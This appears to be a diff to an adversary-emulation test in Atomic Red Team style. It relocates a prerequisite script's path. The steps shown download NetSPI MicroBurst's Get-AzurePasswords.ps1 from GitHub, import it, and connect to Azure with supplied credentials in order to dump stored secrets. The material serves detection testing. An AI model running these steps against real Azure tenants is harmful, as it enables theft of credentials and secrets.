@@ -28,11 +28,12 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      The Get-AzurePasswords script must exist in $env:temp.
+      The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPayloads.
     prereq_command: |
-      if (test-path $env:temp\Get-AzurePasswords.ps1){exit 0} else {exit 1}
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"){exit 0} else {exit 1}
     get_prereq_command: |
-      invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "$env:temp\Get-AzurePasswords.ps1"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
   - description: |
       The Azure RM module must be installed.
     prereq_command: |
@@ -47,7 +48,7 @@ atomic_tests:
       Install-Module -Name Azure -Force -allowclobber
   executor:
     command: |
-      import-module "$env:temp\Get-AzurePasswords.ps1"
+      import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
       $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
       $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
       Connect-AzureRmAccount -Credential $Credential
